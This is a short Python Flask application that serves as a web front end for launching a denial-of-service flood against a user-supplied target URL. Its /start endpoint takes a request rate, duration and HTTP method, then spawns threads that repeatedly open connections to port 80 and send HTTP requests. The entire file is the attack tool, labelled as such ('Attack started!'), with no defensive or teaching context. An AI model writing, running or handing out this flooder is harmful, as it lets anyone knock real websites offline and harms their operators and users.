from flask import Flask, render_template, request, jsonify
import socket
import threading
import time

app = Flask(__name__)

def dos_attack(target_ip, target_port, request_rate, duration, method):
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(f"{method} / HTTP/1.1\r\n".encode(), (target_ip, target_port))
                s.sendto(f"Host: {target_ip}\r\n\r\n".encode(), (target_ip, target_port))
                s.close()
            except:
                pass

    for _ in range(request_rate):
        thread = threading.Thread(target=attack)
        thread.start()

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/start", methods=["POST"])
def start_attack():
    data = request.json
    target_url = data.get("target_url")
    request_rate = int(data.get("request_rate"))
    duration = int(data.get("duration"))
    method = data.get("method", "GET")

    try:
        target_ip = target_url.split("://")[1].split("/")[0]
        target_port = 80
    except IndexError:
        return jsonify({"status": "error", "message": "Invalid Target URL"}), 400

    dos_attack(target_ip, target_port, request_rate, duration, method)
    return jsonify({"status": "success", "message": "Attack started!"})

if __name__ == "__main__":
    app.run(debug=True)
